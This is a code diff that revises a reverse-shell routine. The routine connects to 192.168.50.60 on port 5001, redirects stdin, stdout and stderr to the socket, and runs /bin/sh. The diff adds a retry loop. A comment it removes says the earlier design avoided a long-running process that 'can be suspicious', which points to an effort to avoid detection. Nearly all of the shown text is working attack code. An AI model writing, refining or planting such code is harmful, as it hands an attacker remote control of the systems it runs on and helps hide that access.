@@ -27,18 +27,26 @@ int main() {
     sa.sin_addr.s_addr = vf::inet_addr(192, 168, 50, 60);
     sa.sin_port = htons(5001);
 
-    // Important: make the socket nonblocking because we don't want a long
-    // running process in background that can be suspicious.
-    int s = vf::socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
-    // Ignore the return value here since nonblocking mode can return -1 if the
-    // connection is in progress. If the connection indeed failed, the rest of
-    // the code will not have any side effect.
-    vf::connect(s, (sockaddr*)&sa, sizeof(sa));
+    int s = vf::socket(AF_INET, SOCK_STREAM, 0);
 
+    // retry connecting to server. Give up after 5 seconds to avoid long running
+    // process.
+    int retry = 0;
+    do {
+      if (vf::connect(s, (sockaddr*)&sa, sizeof(sa)) < 0) {
+        vf::sleep(1);
+        retry++;
+      } else {
+        break;
+      }
+    } while (retry < 5);
+
+    // redirect stdin, stdout and stderr to socket.
     if (vf::dup2(s, STDIN_FILENO) < 0 || vf::dup2(s, STDOUT_FILENO) < 0 ||
         vf::dup2(s, STDERR_FILENO) < 0) {
       return;
     }
+    // start the shell
     vf::execve(STR_LITERAL("/bin/sh"), nullptr, nullptr);
   };
 
